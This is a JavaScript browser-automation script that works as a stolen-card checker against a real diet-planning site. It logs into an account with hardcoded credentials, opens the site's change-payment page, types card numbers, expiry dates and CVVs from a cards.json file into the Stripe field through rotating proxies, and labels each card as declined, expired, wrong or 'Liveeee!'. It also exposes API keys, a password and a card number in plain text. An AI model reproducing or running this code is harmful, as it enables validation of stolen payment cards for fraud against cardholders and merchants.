// const puppeteer = require('puppeteer');

// ScraperAPI proxy configuration
// PROXY_USERNAME = 'scraperapi';
// PROXY_PASSWORD = '2f7bd08ffea2236aa31584c5cd897ef8'; // <-- enter your API_Key here
// PROXY_SERVER = 'proxy-server.scraperapi.com';
// PROXY_SERVER_PORT = '8001';

// (async () => {
//     const browser = await puppeteer.launch({
//         ignoreHTTPSErrors: true,
//         args: [
//             `--proxy-server=http://${PROXY_SERVER}:${PROXY_SERVER_PORT}`
//         ]
//     });
//     const page = await browser.newPage();
//     await page.authenticate({
//         username: PROXY_USERNAME,
//         password: PROXY_PASSWORD,
//       });

//     await page.goto('https://example.com');
//     await page.screenshot({ path: 'example.png' });

//     await browser.close();
// })

// const puppeteer = require('puppeteer');

// (async () => {
//     const browser = await puppeteer.launch({
//         ignoreHTTPSErrors: true,
//         args: [
//             `--proxy-server=http://${PROXY_SERVER}:${PROXY_SERVER_PORT}`
//         ]
//     });
//     const page = await browser.newPage();
//     await page.authenticate({
//         username: PROXY_USERNAME,
//         password: PROXY_PASSWORD,
//       });

//       await page.goto('https://news.ycombinator.com', {
//         waitUntil: 'networkidle2',
//       });
//       await page.pdf({ path: 'hn.pdf', format: 'a4' });
    
//       await browser.close();
// })();


// const puppeteer = require('puppeteer');
// const cheerio = require('cheerio');

// /*
// SCRAPER SETTINGS
// You need to define the following values below:
// - API_KEY --> Find this on your dashboard, or signup here to create a 
//                 free account here https://dashboard.scraperapi.com/signup
// */


// // ScraperAPI proxy configuration
// PROXY_USERNAME = 'scraperapi';
// PROXY_PASSWORD = '2f7bd08ffea2236aa31584c5cd897ef8'; // <-- enter your API_Key here
// PROXY_SERVER = 'proxy-server.scraperapi.com';
// PROXY_SERVER_PORT = '8001';

// // where scraped data will be stored
// let scraped_quotes = [];

// (async () => {
//     const browser = await puppeteer.launch({
//         ignoreHTTPSErrors: true,
//         args: [
//             `--proxy-server=http://${PROXY_SERVER}:${PROXY_SERVER_PORT}`
//         ]
//     });
//     const page = await browser.newPage();
//     await page.authenticate({
//         username: PROXY_USERNAME,
//         password: PROXY_PASSWORD,
//       });
    

//     try {
//         await page.goto('https://www.buymeacoffee.com/NXRUBPROJECT');
//         await page.screenshot({ path: 'example.png' });


//     } catch(err) {
//         console.log(err);
//     }
    
//     await browser.close();

// })();

// PROXY_USERNAME = 'scraperapi';
// PROXY_PASSWORD = '2f7bd08ffea2236aa31584c5cd897ef8'; // <-- enter your API_Key here
// PROXY_SERVER = 'proxy-server.scraperapi.com';
// PROXY_SERVER_PORT = '8001';

// (async () => {
//     const browser = await chromium.launch({
//         headless: false,
//         proxy: {
//             server: `http://${PROXY_SERVER}:${PROXY_SERVER_PORT}`,
//             username: PROXY_USERNAME,
//             password: PROXY_PASSWORD
//         },
//     });

//     const context = await browser.newContext({ ignoreHTTPSErrors: true});

//     const page = await context.newPage();
//     await page.goto('https://www.buymeacoffee.com/NXRUBPROJECT', {
//         timeout: 0 
//     });

//     await page.click('.btn-dot-loader')

//     await page.screenshot({ path: 'example.png' });
//     await browser.close();
//   })();

const { chromium } = require('playwright');
const cheerio = require('cheerio');
const fs = require('fs');

const declined = 'declined.';
const incorrecCVV = 'code';
const expired = 'expired.';
const live = 'successfully';
const incorrectNumber = 'number';

PROXY_USERNAME = 'scraperapi';
PROXY_PASSWORD = '2f7bd08ffea2236aa31584c5cd897ef8'; // <-- enter your API_Key here
PROXY_SERVER = 'proxy-server.scraperapi.com';
PROXY_SERVER_PORT = '8001';


// (async () => {
//     const browser = await chromium.launch({
//         headless: false,
//         defaultViewport: {
//             width: 500,
//             height: 900
//         },
//     });

//     const context = await browser.newContext({ ignoreHTTPSErrors: true});

//     const page = await context.newPage();
//     await page.goto('https://www.eatthismuch.com/user/login/', {
//         timeout: 0 
//     });


//     const email = await page.$('.form-control');
//     const password = await page.$('input[type="password"]');
//     await email.type('dutoeliu@gmail.com', { delay: 50 }); 
//     await password.type('01Duarte.', { delay: 50 });
//     await (await page.$('input[type="password"]')).press('Enter');


//     // const pagePayment = await context.newPage();
//     // await pagePayment.goto('https://www.eatthismuch.com/change-payment/', {
//     //     timeout: 0 
//     // });
    
//     // await page.close();

//     // const stripe = await pagePayment.$('#card-element')

//     // await stripe.click();
//     // await stripe.type('4037070103345130.', { delay: 50 });
//     // await stripe.type('04/24.', { delay: 50 });
//     // await stripe.type('123.', { delay: 50 });
//     // await (await pagePayment.$('#card-element')).press('Enter');

//     // await pagePayment.waitForTimeout(7000);

//     // const pageData = await pagePayment.evaluate(() => {
//     //     return {
//     //         html: document.documentElement.innerHTML,
//     //         width: document.documentElement.clientWidth,
//     //         height: document.documentElement.clientHeight
//     //     };
//     // });

//     // const $ = cheerio.load(pageData.html);
//     // const elemnt = $('div[class="alert alert-info"]');
//     // const mensaje = elemnt.text();

//     // let posicion = mensaje.indexOf(declined);
//     // let posicion2 = mensaje.indexOf(incorrectNumber);
//     // let posicion3 = mensaje.indexOf(expired);
//     // let posicion4 = mensaje.indexOf(live);

//     // if(posicion !== -1){
//     //     console.log('Card declined');
//     //     await pagePayment.reload();
//     // }else if(posicion2 !== -1){
//     //     console.log('Numero incorrecto');
//     //     await pagePayment.reload();
//     // }else if(posicion3 !== -1){
//     //     console.log('Tarjeta expirada');
//     //     await pagePayment.reload();
//     // }else if(posicion4 !== -1){
//     //     console.log('Liveeeeee!!!');
//     // }

//     // Your card number is incorrect.
//     // Your card was declined.
//     // Your payment info has been successfully updated.

//     // await pagePayment.reload();

//     const pagePayment = await context.newPage();
//     await pagePayment.goto('https://www.eatthismuch.com/change-payment/', {
//         timeout: 0 
//     });

//     await page.close();

//     fs.readFile('cards.json', (err, data) => {
//         if(err) throw err;
//         let cards = JSON.parse(data);

//         for(card in cards){
//             console.log(card.cardnumber);
//         }
//     })
    

//     // fs.readFile('cards.json', (err, data) => {
//     //     if (err) throw err;
//     //     let cards = JSON.parse(data);
        
//     //     cards.forEach((card) => {
//     //         const tarjeta = card.cardnumber;
//     //         const fecha = card.fecha;
//     //         const cvv = card.cvv;

//     //         const stripe = await pagePayment.$('#card-element')

//     //         await stripe.click();
//     //         await stripe.type(tarjeta, { delay: 50 });
//     //         await stripe.type(fecha, { delay: 50 });
//     //         await stripe.type(cvv, { delay: 50 });
//     //         await (await pagePayment.$('#card-element')).press('Enter');
        
//     //         await pagePayment.waitForTimeout(7000);
        
//     //         const pageData = await pagePayment.evaluate(() => {
//     //             return {
//     //                 html: document.documentElement.innerHTML,
//     //                 width: document.documentElement.clientWidth,
//     //                 height: document.documentElement.clientHeight
//     //             };
//     //         });
        
//     //         const $ = cheerio.load(pageData.html);
//     //         const elemnt = $('div[class="alert alert-info"]');
//     //         const mensaje = elemnt.text();
        
//     //         let posicion = mensaje.indexOf(declined);
//     //         let posicion2 = mensaje.indexOf(incorrectNumber);
//     //         let posicion3 = mensaje.indexOf(expired);
//     //         let posicion4 = mensaje.indexOf(live);
        
//     //         if(posicion !== -1){
//     //             console.log("Card declined:"+ card.cardnumber+ "||"+ card.fecha+ "||"+ card.cvv);
//     //         }else if(posicion2 !== -1){
//     //             console.log("Numero incorrecto:"+ card.cardnumber+ "||"+ card.fecha+ "||"+ card.cvv);

//     //         }else if(posicion3 !== -1){
//     //             console.log("Tarjeta expirada:"+ card.cardnumber+ "||"+ card.fecha+ "||"+ card.cvv);

//     //         }else if(posicion4 !== -1){
//     //             console.log("Liveeeee:"+ card.cardnumber+ "||"+ card.fecha+ "||"+ card.cvv);
//     //         }
//     //     });
//     // });

//     await pagePayment.screenshot({ path: 'example.png' });
//     await browser.close();
//   })();

fs.readFile('cards.json', (err, data) => {
    if(err) throw err;
    let cards = JSON.parse(data);

    (async () => {
    const browser = await chromium.launch({
        headless: false,
        defaultViewport: {
            width: 500,
            height: 900
        },
        proxy: {
            server: 'l56ff.ep-proxy.net:33146',
            username: 'ephemeral-proxies.p.rapidapi.com',
            password: 'c725c0f033msh78d53d0038c9d96p1143fbjsna14fbfcf4b26'
        },
        params: {countries: 'PL'}
    });

    const context = await browser.newContext({ ignoreHTTPSErrors: true});
    const page = await context.newPage();
    await page.goto('https://www.eatthismuch.com/user/login/', {
        timeout: 0 
    });

    const email = await page.$('.form-control');
    const password = await page.$('input[type="password"]');
    await email.type('dutoeliu@gmail.com', { delay: 50 }); 
    await password.type('01Duarte.', { delay: 50 });
    await (await page.$('input[type="password"]')).press('Enter');

    const pagePayment = await context.newPage();
    await pagePayment.goto('https://www.eatthismuch.com/change-payment/', {
        timeout: 0 
    });
    
    await page.close();

    for(card in cards) {

        const stripe = await pagePayment.$('#card-element', { timeout: 0 })

        await pagePayment.waitForTimeout(10000);

        await stripe.click ({ clickCount: 2 });

        await pagePayment.waitForTimeout(10000);

        await stripe.type(`'${cards[card].cardnumber}'`, { delay: 70 });
        await stripe.type(`'${cards[card].fecha}'`, { delay: 70 });
        await stripe.type(`'${cards[card].cvv}'`, { delay: 70 });
        // await stripe.type('33122', { delay: 70 });
        await (await pagePayment.$('#card-element')).press('Enter');
    
        await pagePayment.waitForTimeout(10000);

        const pageData = await pagePayment.evaluate(() => {
            return {
                html: document.documentElement.innerHTML,
                width: document.documentElement.clientWidth,
                height: document.documentElement.clientHeight
            };
        });
    
        const $ = cheerio.load(pageData.html);
        const elemnt = $('div[class="alert alert-info"]');
        const mensaje = elemnt.text();
    
        let posicion = mensaje.indexOf(declined);
        let posicion2 = mensaje.indexOf(incorrecCVV);
        let posicion3 = mensaje.indexOf(expired);
        let posicion4 = mensaje.indexOf(live);
        let posicion5 = mensaje.indexOf(incorrectNumber);
    
        if(posicion !== -1){
            console.log(`Card Declined: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
            await pagePayment.waitForTimeout(10000);
        }else if(posicion2 !== -1){
            console.log(`CVV2 Incorrecto: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
            await pagePayment.waitForTimeout(10000);

        }else if(posicion3 !== -1){
            console.log(`Tarjeta Expirada: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
            await pagePayment.waitForTimeout(10000);

        }else if(posicion5 !== -1){
            console.log(`Numero incorrecto: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
            await pagePayment.waitForTimeout(10000);

        }else if(posicion4 !== -1){
            console.log(`Liveeee!: ${cards[card].cardnumber}||${cards[card].fecha}||${cards[card].cvv}\n`);
            await pagePayment.waitForTimeout(10000);
        }
    }
    await pagePayment.screenshot({ path: 'example.png' });
    await browser.close();
    })();
})



// const axios = require("axios");

// const options = {
//   method: 'GET',
//   url: 'https://ephemeral-proxies.p.rapidapi.com/v1/proxy',
//   params: {countries: 'NL'},
//   headers: {
//     'X-RapidAPI-Host': 'ephemeral-proxies.p.rapidapi.com',
//     'X-RapidAPI-Key': 'c725c0f033msh78d53d0038c9d96p1143fbjsna14fbfcf4b26'
//   }
// };

// axios.request(options).then(function (response) {
//  console.log(response.data);
// }).catch(function (error) {
//  console.error(error);
// });